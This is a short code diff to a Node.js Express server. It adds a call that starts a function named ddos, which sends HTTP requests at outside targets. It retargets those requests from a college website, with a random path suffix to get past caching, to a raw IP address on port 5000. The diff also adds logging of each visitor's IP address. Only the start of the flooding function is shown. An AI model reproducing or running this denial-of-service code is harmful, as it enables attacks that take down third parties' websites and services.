@@ -6,14 +6,16 @@ const app=express();
 const server=http.createServer(app)
 const listener=server.listen(port,hostname,()=>{console.log("Server spinned up on port "+listener.address().port)});
 app.get("/",(req,res,next)=>{
+  console.log(req. connection. remoteAddress)
 res.send("stupidity not allowed")
 res.end()
 
 })
-
+setTimeout(ddos,1000)
 function ddos(){
     const extra=Math.random()
-    const uril='http://mpcautocollege.org.in/a'+extra
+    // const uril='http://13.233.2.27:5000/'+extra
+    const uril='http://13.233.2.27:5000/'
     http.get(uril, {headers:{ 'User-Agent': 'Node Server' }},(resp) => {
         let pythonData = '';
       
